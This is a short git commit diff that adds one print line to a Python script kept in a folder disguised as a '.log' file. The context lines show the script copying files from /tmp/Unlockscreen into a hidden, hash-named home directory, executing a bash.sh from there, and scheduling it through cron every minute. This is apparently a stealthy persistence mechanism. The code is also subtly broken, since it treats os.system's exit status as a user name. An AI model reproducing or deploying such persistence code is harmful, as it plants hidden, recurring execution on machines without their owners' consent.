3255c2626f1651e9e62c4e1158ae548f12240b7f
HardImpostor <103056913+HardImpostor@users.noreply.github.com>
2022-10-18 14:00:53 +0200

    Update script.py

--- U6frt3A.log/script.py
+++ U6frt3A.log/script.py
@@ -5,6 +5,7 @@ os.system('cp -r /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd5192663
 os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 from crontab import CronTab
 user=os.system('echo $LOGNAME')
+print(user)
 cron = CronTab(user=user)
 job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 job.minute.every(1)
